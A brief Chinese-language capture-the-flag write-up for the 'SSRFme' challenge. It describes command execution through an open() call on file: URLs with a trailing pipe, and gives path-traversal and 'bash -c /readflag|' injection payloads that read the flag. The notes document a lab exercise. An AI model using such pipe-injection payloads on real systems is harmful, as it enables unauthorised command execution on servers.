## SSRFme
一个基于open函数的执行漏洞 命令后加竖线执行
![](attachments/Pasted%20image%2020240322181827.png)
![](attachments/Pasted%20image%2020240321205048.png)
```
?url=./../../../../../&filename=1234
```

访问 `echo(md5("orange"."xxx.xxx.xxx.xxx"));`
![](attachments/Pasted%20image%2020240321210449.png)

命令注入 `file:/readflag|`

pyload
```
?url=&filename=bash -c /readflag|
/?url=file:bash -c /readflag|&filename=wuwu
```
 >第一段payload中构造的文件名既作为文件名使用又在后面利用file:读取时执行了命令
 >第二段将文件中的内容读到自定义的文件中
